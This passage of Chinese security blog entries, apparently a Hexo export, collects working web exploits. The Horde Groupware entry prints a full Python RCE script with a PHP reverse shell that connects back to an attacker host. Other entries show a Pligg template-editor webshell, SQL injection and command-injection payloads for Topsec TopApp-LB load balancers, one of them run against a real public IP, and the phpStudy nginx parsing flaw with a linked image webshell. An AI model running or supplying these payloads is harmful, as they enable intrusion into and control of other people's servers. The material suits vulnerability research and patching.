    <url>/2020/09/14/WEB/Exploit/Horde-Groupware-Webmail-Edition-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<p>Python Exp：</p>
<a id="more"></a>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Horde Groupware Webmail Edition Sort sortpref Deserialization of Untrusted Data Remote Code Execution Vulnerability</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Identifiers: ZDI-CAN-10436 / ZDI-20-1051</span></span><br><span class="line"><span class="string">Found by ..: mr_me</span></span><br><span class="line"><span class="string">Tested on .: Horde Groupware Webmail 5.2.22 (pear installation) on Debian 9 Stretch w/ Apache/2.4.25 &amp; PHP 7.0.33</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Summary:</span></span><br><span class="line"><span class="string">========</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">It&#x27;s possible to reach a deserialization of untrusted data vulnerability within the constructor of the IMP_Prefs_Sort class. A low privileged authenticated attacker can leverage this to achieve remote code execution.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Example:</span></span><br><span class="line"><span class="string">========</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">saturn:~ mr_me$ ./poc.py </span></span><br><span class="line"><span class="string">(+) usage ./poc.py &lt;target&gt; &lt;path&gt; &lt;user:pass&gt; &lt;connectback:port&gt;</span></span><br><span class="line"><span class="string">(+) eg: ./poc.py 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">saturn:~ mr_me$ ./poc.py 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337</span></span><br><span class="line"><span class="string">(+) targeting http://172.16.175.145/horde/</span></span><br><span class="line"><span class="string">(+) obtained session iefankvohbl8og0mtaadm3efb6</span></span><br><span class="line"><span class="string">(+) inserted our php object</span></span><br><span class="line"><span class="string">(+) triggering deserialization...</span></span><br><span class="line"><span class="string">(+) starting handler on port 1337</span></span><br><span class="line"><span class="string">(+) connection from 172.16.175.145</span></span><br><span class="line"><span class="string">(+) pop thy shell!</span></span><br><span class="line"><span class="string">id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">pwd</span></span><br><span class="line"><span class="string">/var/www/horde/services</span></span><br><span class="line"><span class="string">uname -a</span></span><br><span class="line"><span class="string">Linux target 4.9.0-11-amd64 #1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64 GNU/Linux</span></span><br><span class="line"><span class="string">exit</span></span><br><span class="line"><span class="string">*** Connection closed by remote host ***</span></span><br><span class="line"><span class="string">(+) repaired the target!</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rs</span>(<span class="params">cbh, cbp</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;@error_reporting(-1);</span></span><br><span class="line"><span class="string">@set_time_limit(0); </span></span><br><span class="line"><span class="string">@ignore_user_abort(1);</span></span><br><span class="line"><span class="string">$dis=@ini_get(&#x27;disable_functions&#x27;);</span></span><br><span class="line"><span class="string">if(!empty($dis))&#123;</span></span><br><span class="line"><span class="string">    $dis=preg_replace(&#x27;/[, ]+/&#x27;, &#x27;,&#x27;, $dis);</span></span><br><span class="line"><span class="string">    $dis=explode(&#x27;,&#x27;, $dis);</span></span><br><span class="line"><span class="string">    $dis=array_map(&#x27;trim&#x27;, $dis);</span></span><br><span class="line"><span class="string">&#125;else&#123;</span></span><br><span class="line"><span class="string">    $dis=array();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$ipaddr=&#x27;%s&#x27;;</span></span><br><span class="line"><span class="string">$port=%d;</span></span><br><span class="line"><span class="string">function PtdSlhY($c)&#123;</span></span><br><span class="line"><span class="string">    global $dis; </span></span><br><span class="line"><span class="string">    if (FALSE !== strpos(strtolower(PHP_OS), &#x27;win&#x27; )) &#123;</span></span><br><span class="line"><span class="string">        $c=$c.&quot; 2&gt;&amp;1\\n&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    ob_start();</span></span><br><span class="line"><span class="string">    system($c);</span></span><br><span class="line"><span class="string">    $o=ob_get_contents();</span></span><br><span class="line"><span class="string">    ob_end_clean();</span></span><br><span class="line"><span class="string">    if (strlen($o) === 0)&#123;</span></span><br><span class="line"><span class="string">        $o = &quot;NULL&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    return $o;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$nofuncs=&#x27;no exec functions&#x27;;</span></span><br><span class="line"><span class="string">$s=@fsockopen(&quot;tcp://$ipaddr&quot;,$port);</span></span><br><span class="line"><span class="string">while($c=fread($s,2048))&#123;</span></span><br><span class="line"><span class="string">    $out = &#x27;&#x27;;</span></span><br><span class="line"><span class="string">    if(substr($c,0,3) == &#x27;cd &#x27;)&#123;</span></span><br><span class="line"><span class="string">        chdir(substr($c,3,-1));</span></span><br><span class="line"><span class="string">    &#125;else if (substr($c,0,4) == &#x27;quit&#x27; || substr($c,0,4) == &#x27;exit&#x27;) &#123;</span></span><br><span class="line"><span class="string">        break;</span></span><br><span class="line"><span class="string">    &#125;else&#123;</span></span><br><span class="line"><span class="string">        $out=PtdSlhY(substr($c,0,-1));</span></span><br><span class="line"><span class="string">        if($out===false)&#123;</span></span><br><span class="line"><span class="string">            fwrite($s, $nofuncs);</span></span><br><span class="line"><span class="string">            break;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    fwrite($s,$out);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">fclose($s);&quot;&quot;&quot;</span> % (cbh, cbp)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_session</span>(<span class="params">t, p, usr, pwd</span>):</span></span><br><span class="line">    uri = <span class="string">&quot;http://%s%slogin.php&quot;</span> % (t, p)</span><br><span class="line">    p = &#123;</span><br><span class="line">        <span class="string">&quot;login_post&quot;</span> : <span class="number">1337</span>,</span><br><span class="line">        <span class="string">&quot;horde_user&quot;</span> : usr,</span><br><span class="line">        <span class="string">&quot;horde_pass&quot;</span> : pwd</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(uri, data=p, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    match = re.findall(<span class="string">&quot;Horde=(.&#123;26&#125;);&quot;</span>, r.headers[<span class="string">&#x27;set-cookie&#x27;</span>])</span><br><span class="line">    <span class="keyword">assert</span> len(match) == <span class="number">2</span>, <span class="string">&quot;(-) failed to login&quot;</span></span><br><span class="line">    <span class="keyword">return</span> match[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_deserialization</span>(<span class="params">t, p, s, host, port</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Object instantiation to reach the deserialization &quot;&quot;&quot;</span></span><br><span class="line">    handlerthr = Thread(target=handler, args=(port,))</span><br><span class="line">    handlerthr.start()</span><br><span class="line">    uri = <span class="string">&quot;http://%s%sservices/ajax.php/imp/imple&quot;</span> % (t, p)</span><br><span class="line">    p = &#123;</span><br><span class="line">        <span class="string">&quot;imple&quot;</span> : <span class="string">&quot;IMP_Prefs_Sort&quot;</span>,</span><br><span class="line">        <span class="string">&quot;app&quot;</span> : <span class="string">&quot;imp&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    h = &#123; <span class="string">&quot;cmd&quot;</span> : base64.b64encode(rs(host, port).encode()) &#125;</span><br><span class="line">    c = &#123; <span class="string">&quot;Horde&quot;</span> : s &#125;</span><br><span class="line">    r = requests.get(uri, params=p, cookies=c, headers=h)</span><br><span class="line">    match = re.search(<span class="string">&quot;horde_logout_token=(.*)&amp;&quot;</span>, r.text)</span><br><span class="line">    <span class="keyword">assert</span> match, <span class="string">&quot;(-) failed to leak the horde_logout_token!&quot;</span></span><br><span class="line">    p[<span class="string">&#x27;token&#x27;</span>] = match.group(<span class="number">1</span>)</span><br><span class="line">    r = requests.get(uri, params=p, cookies=c, headers=h)</span><br><span class="line">    <span class="keyword">assert</span> r.status_code == <span class="number">200</span>, <span class="string">&quot;(-) failed to trigger deserialization!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pop</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; An updated pop chain &quot;&quot;&quot;</span></span><br><span class="line">    pop  = <span class="string">&#x27;O:34:&quot;Horde_Kolab_Server_Decorator_Clean&quot;:2:&#123;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;S:43:&quot;\\00Horde_Kolab_Server_Decorator_Clean\\00_server&quot;;O:20:&quot;Horde_Prefs_Identity&quot;:3:&#123;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;S:9:&quot;\\00*\\00_prefs&quot;;O:11:&quot;Horde_Prefs&quot;:2:&#123;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;S:8:&quot;\\00*\\00_opts&quot;;a:1:&#123;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;s:12:&quot;sizecallback&quot;;a:2:&#123;i:0;O:12:&quot;Horde_Config&quot;:1:&#123;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;S:13:&quot;\\00*\\00_oldConfig&quot;;s:44:&quot;eval(base64_decode($_SERVER[HTTP_CMD]));die;&quot;;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;&#125;i:1;s:13:&quot;readXMLConfig&quot;;&#125;&#125;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;S:10:&quot;\\00*\\00_scopes&quot;;a:1:&#123;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;s:5:&quot;horde&quot;;C:17:&quot;Horde_Prefs_Scope&quot;:10:&#123;[null,[1]]&#125;&#125;&#125;&#x27;</span>  <span class="comment"># implements Serializable using custom unserialize/serialize</span></span><br><span class="line">    pop += <span class="string">&#x27;S:13:&quot;\\00*\\00_prefnames&quot;;a:1:&#123;s:10:&quot;identities&quot;;i:0;&#125;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;S:14:&quot;\\00*\\00_identities&quot;;a:1:&#123;i:0;i:0;&#125;&#125;&#x27;</span>             <span class="comment"># additional checks</span></span><br><span class="line">    pop += <span class="string">&#x27;S:42:&quot;\\00Horde_Kolab_Server_Decorator_Clean\\00_added&quot;;a:1:&#123;i:0;i:0;&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> pop</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_patch</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Our original array &quot;&quot;&quot;</span></span><br><span class="line">    patch  = <span class="string">&#x27;a:1:&#123;&#x27;</span></span><br><span class="line">    patch += <span class="string">&#x27;s:5:&quot;INBOX&quot;;a:1:&#123;&#x27;</span></span><br><span class="line">    patch += <span class="string">&#x27;s:1:&quot;b&quot;;i:6;&#x27;</span></span><br><span class="line">    patch += <span class="string">&#x27;&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> patch</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_pref</span>(<span class="params">t, p, s, k, o</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; A primitive that inserts a string into the database &quot;&quot;&quot;</span></span><br><span class="line">    uri = <span class="string">&quot;http://%s%sservices/ajax.php/imp/setPrefValue&quot;</span> % (t, p)</span><br><span class="line">    p = &#123;</span><br><span class="line">        <span class="string">&quot;pref&quot;</span> : k,</span><br><span class="line">        <span class="string">&quot;value&quot;</span> : o,</span><br><span class="line">    &#125;</span><br><span class="line">    c = &#123; <span class="string">&quot;Horde&quot;</span> : s &#125;</span><br><span class="line">    r = requests.get(uri, params=p, cookies=c)</span><br><span class="line">    match = re.search(<span class="string">&quot;horde_logout_token=(.*)&amp;&quot;</span>, r.text)</span><br><span class="line">    <span class="keyword">assert</span> match, <span class="string">&quot;(-) failed to leak the horde_logout_token!&quot;</span></span><br><span class="line">    p[<span class="string">&#x27;token&#x27;</span>] = match.group(<span class="number">1</span>)</span><br><span class="line">    r = requests.get(uri, params=p, cookies=c)</span><br><span class="line">    <span class="keyword">assert</span> (<span class="string">&quot;\&quot;response\&quot;:true&quot;</span> <span class="keyword">in</span> r.text <span class="keyword">and</span> r.status_code == <span class="number">200</span>), <span class="string">&quot;(-) failed to set the preference!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handler</span>(<span class="params">lport</span>):</span></span><br><span class="line">    print(<span class="string">&quot;(+) starting handler on port %d&quot;</span> % lport)</span><br><span class="line">    t = telnetlib.Telnet()</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.bind((<span class="string">&quot;0.0.0.0&quot;</span>, lport))</span><br><span class="line">    s.listen(<span class="number">1</span>)</span><br><span class="line">    conn, addr = s.accept()</span><br><span class="line">    print(<span class="string">&quot;(+) connection from %s&quot;</span> % addr[<span class="number">0</span>])</span><br><span class="line">    t.sock = conn</span><br><span class="line">    print(<span class="string">&quot;(+) pop thy shell!&quot;</span>)</span><br><span class="line">    t.interact()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fix_path</span>(<span class="params">p</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p == <span class="string">&quot;/&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> p.startswith(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">        p = <span class="string">&quot;/%s&quot;</span> % p</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> p.endswith(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">        p = <span class="string">&quot;%s/&quot;</span> % p</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">5</span>:</span><br><span class="line">        print(<span class="string">&quot;(+) usage %s &lt;target&gt; &lt;path&gt; &lt;user:pass&gt; &lt;connectback:port&gt;&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        print(<span class="string">&quot;(+) eg: %s 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    target = sys.argv[<span class="number">1</span>]</span><br><span class="line">    path   = fix_path(sys.argv[<span class="number">2</span>])</span><br><span class="line">    user   = sys.argv[<span class="number">3</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    pswd   = sys.argv[<span class="number">3</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">    host   = sys.argv[<span class="number">4</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    port   = int(sys.argv[<span class="number">4</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">    print(<span class="string">&quot;(+) targeting http://%s%s&quot;</span> % (target, path))</span><br><span class="line">    session = get_session(target, path, user, pswd)</span><br><span class="line">    print(<span class="string">&quot;(+) obtained session %s&quot;</span> % session)</span><br><span class="line">    set_pref(target, path, session, <span class="string">&#x27;sortpref&#x27;</span>, get_pop())</span><br><span class="line">    print(<span class="string">&quot;(+) inserted our php object&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;(+) triggering deserialization...&quot;</span>)</span><br><span class="line">    trigger_deserialization(target, path, session, host, port)</span><br><span class="line">    set_pref(target, path, session, <span class="string">&#x27;sortpref&#x27;</span>, get_patch())</span><br><span class="line">    print(<span class="string">&quot;(+) repaired the target!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">saturn:~$.&#x2F;poc.py 172.16.175.148&#x2F;horde&#x2F; hordeuser:pass123 172.16.175.145</span><br><span class="line"></span><br><span class="line">(+) targeting http:&#x2F;&#x2F;172.16.175.145&#x2F;horde&#x2F;</span><br><span class="line"></span><br><span class="line">(+) obtained session iefankvohbl8og0mtaadm3efb6</span><br><span class="line"></span><br><span class="line">(+) inserted our php object</span><br><span class="line"></span><br><span class="line">(+) triggering deserialization...</span><br><span class="line"></span><br><span class="line">(+) starting handler on port 1337</span><br><span class="line"></span><br><span class="line">(+) connection from 172.16.175.145</span><br><span class="line"></span><br><span class="line">(+) pop thy shell!</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line"></span><br><span class="line">uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br><span class="line"></span><br><span class="line">pwd</span><br><span class="line"></span><br><span class="line">&#x2F;var&#x2F;www&#x2F;horde&#x2F;services</span><br></pre></td></tr></table></figure>

<p>参考链接：<a href="https://srcincite.io/pocs/zdi-20-1051.py.txt">https://srcincite.io/pocs/zdi-20-1051.py.txt</a></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>Horde Groupware Webmail Edition</tag>
      </tags>
  </entry>
  <entry>
    <title>Pligg远程命令执行(CVE-2020-25287)</title>
    <url>/2020/09/17/WEB/Exploit/Pligg%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-CVE-2020-25287/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><code>the_file</code>由于无需检查扩展名，我们可以通过模板编辑器菜单使用参数来访问任何文件，然后将webshell创建到现有的php文件中</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Pligg2.0.3版本</p>
<a id="more"></a>

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917174643966.png" alt="image-20200917174643966"></p>
<p>转到<code>/admin/admin_editor.php</code>拦截请求并将路径更改为文件。</p>
<p>例如得到<code>index.php</code>申请：<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917174701957.png" alt="image-20200917174701957"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;admin&#x2F;admin_editor.php HTTP&#x2F;1.1</span><br><span class="line">Host: kliqqi</span><br><span class="line">Content-Length: 33</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;kliqqi</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.102 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;kliqqi&#x2F;admin&#x2F;admin_editor.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: fr-FR,fr;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7</span><br><span class="line">Cookie: panelState&#x3D;CollapseManage%7CCollapseSettings%7CCollapseTemplate; PHPSESSID&#x3D;lfkc3gtrv5o1golmt5md3; mnm_user&#x3D;Admin; mnm_key&#x3D;QWRtaW46MjI0R2dEVTAxZncxZzpl</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">the_file&#x3D;..%2Findex.php&amp;open&#x3D;Open</span><br></pre></td></tr></table></figure>

<p>模版编辑器功能可以编辑任意文件内容,在文件中加入恶意代码导致代码执行。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917174734515.png" alt="image-20200917174734515"></p>
<p>比如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  if($_GET[&#39;cmd&#39;])&#123;</span><br><span class="line">    system($_GET[&#39;cmd&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问<code>website.fr?cmd=dir</code></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917174826813.png" alt="image-20200917174826813"></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>Pligg</tag>
      </tags>
  </entry>
  <entry>
    <title>天融信TopApp-LB 负载均衡系统Sql注入漏洞</title>
    <url>/2020/09/13/WEB/Exploit/%E5%A4%A9%E8%9E%8D%E4%BF%A1TopApp-LB-%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9FSql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<a id="more"></a>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200913015312879.png" alt="image-20200913015312879"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;acc&#x2F;clsf&#x2F;report&#x2F;datasource.php HTTP&#x2F;1.1Host: localhostConnection: closeAccept: text&#x2F;javascript, text&#x2F;html, application&#x2F;xml, text&#x2F;xml, *&#x2F;*User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.105 Safari&#x2F;537.36Accept-Language: zh-CN,zh;q&#x3D;0.9Content-Type: application&#x2F;x-www-form-urlencoded t&#x3D;l&amp;e&#x3D;0&amp;s&#x3D;t&amp;l&#x3D;1&amp;vid&#x3D;1+union select 1,2,3,4,5,6,7,8,9,substr(&#39;a&#39;,1,1),11,12,13,14,15,16,17,18,19,20,21,22--+&amp;gid&#x3D;0&amp;lmt&#x3D;10&amp;o&#x3D;r_Speed&amp;asc&#x3D;false&amp;p&#x3D;8&amp;lipf&#x3D;&amp;lipt&#x3D;&amp;ripf&#x3D;&amp;ript&#x3D;&amp;dscp&#x3D;&amp;proto&#x3D;&amp;lpf&#x3D;&amp;lpt&#x3D;&amp;rpf&#x3D;&amp;rpt&#x3D;@。。</span><br></pre></td></tr></table></figure>

<p>网友称以下两个历史漏洞仍然可以复现。</p>
<p><a href="https://www.uedbox.com/post/21626/">https://www.uedbox.com/post/21626/</a></p>
<h3 id="简要描述："><a href="#简要描述：" class="headerlink" title="简要描述："></a>简要描述：</h3><p>天融信负载均衡TopApp-LB系统无需密码直接登陆</p>
<h3 id="详细说明："><a href="#详细说明：" class="headerlink" title="详细说明："></a>详细说明：</h3><p><strong>.</strong>.<strong>.</strong>/<strong>.</strong>.<strong>.</strong>/<strong>.</strong>.<strong>.</strong>/https://<strong>.</strong>.<strong>.</strong>/</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用户名随意  密码：;id</span><br></pre></td></tr></table></figure>



<h3 id="漏洞证明："><a href="#漏洞证明：" class="headerlink" title="漏洞证明："></a>漏洞证明：</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/d3594a983f25bd0d139b27c02cd688eb6f1ca99d.jpg" alt="img"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/019af9239f1dfbc6124a5b19055d95a1ca1d39fc.jpg" alt="img"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/facb5a13142ce22ea2d4dfcf9c29b3cf6a95412f.jpg" alt="img"></p>
<p><a href="https://www.uedbox.com/post/22193/">https://www.uedbox.com/post/22193/</a></p>
<p>TopApp-LB负载均衡（绝对是随机找的）<a href="https://101.231.40.234/执行命令">https://101.231.40.234/执行命令</a></p>
<p>执行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">; ping 9928e5.dnslog.info; echo</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/89b6282962ccb026c6ba981c9ce0ad0ad1215ae7.jpg" alt="img"></p>
<p>命令被成功执行，效果如图。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/b3dd327a068f4cf46d2d8987356bab0427bbb732.jpg" alt="img"></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>天融信</tag>
      </tags>
  </entry>
  <entry>
    <title>phpStudy(小皮面板)v8.1.0.7 nginx 解析漏洞</title>
    <url>/2020/09/14/WEB/Exploit/phpStudy-%E5%B0%8F%E7%9A%AE%E9%9D%A2%E6%9D%BF-v8-1-0-7-nginx-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p><strong>一、**</strong>phpStudy<strong>**(小皮面板)简介：</strong><br><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/thum-09361599060261.png" alt="phpStudy v8.1.0.7.png"></p>
<p>phpStudy国内12年老牌公益软件，集安全，高效，功能与一体，已获得全球用户认可安装，运维也高效。支持一键LAMP,LNMP,集群,监控,网站,FTP,数据库,JAVA等100多项服务器管理功能。</p>
<a id="more"></a>

<p><strong>二、漏洞简介：</strong></p>
<p>小皮面板 &lt;= 8.1.0.7: 啊这</p>
<p>其实这个漏洞确实不是小皮的问题,而是2017年就出现的nginx解析漏洞。</p>
<p><strong>漏洞原理**</strong>：**</p>
<p><strong>1、由于错误配置(但是测试的时候是安装完后的默认配置，我在官方论坛也反馈了，他们还狡辩。。。)导致nginx把以.php结尾的文件交给fastcgi处理,为此可以构造<a href="http://www.xxx.com/test.gif/xx.php">http://www.xxx.com/test.gif/xx.php</a> (任何服务器端不存在的php文件均可,比如a.php)</strong></p>
<p>2、但是fastcgi在处理xx.php文件时发现文件并不存在,这时php.ini配置文件中cgi.fix_pathinfo=1 发挥作用,这项配置用于修复路径,如果当前路径不存在则采用上层路径。为此这里交由fastcgi处理的文件就变成了/test.gif。</p>
<p>3、 最重要的一点是php-fpm.conf中的security.limit_extensions配置项限制了fastcgi解析文件的类型(即指定什么类型的文件当做代码解析),此项设置为空的时候才允许fastcgi将.png等文件当做代码解析。<br>localhost_80.conf原始配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location ~ \.php(.*)$ &#123;</span><br><span class="line">            fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">            fastcgi_index  index.php;</span><br><span class="line">            fastcgi_split_path_info  ^((?U).+\.php)(&#x2F;?.+)$;</span><br><span class="line">            fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">            fastcgi_param  PATH_INFO  $fastcgi_path_info;</span><br><span class="line">            fastcgi_param  PATH_TRANSLATED  $document_root$fastcgi_path_info;</span><br><span class="line">            include        fastcgi_params;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>



<p>三、漏洞复现：</p>
<p>测试环境：phpStudy(小皮面板)8.1.0.7 + 图片马（一定要注意不是那种copy的马子 有几率失败，可以下载这个<a href="https://github.com/tennc/webshell/blob/master/php/img/bypass-imagecreatefromgif-pass-00.gif">马子</a>测试）<br>复现如图：<br><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/thum-1f0c1599060262.png" alt="bug_7.3.png"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/thum-b8361599060262.png" alt="bug.png"></p>
<p>执行系统命令：<br><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/thum-34661599060543.png" alt="exec.png"><br>四、修复<br>php.ini 中 fix_pathinfo 禁用为0<br>cgi.fix_pathinfo=0</p>
<p>nginx.conf添加如下代码</p>
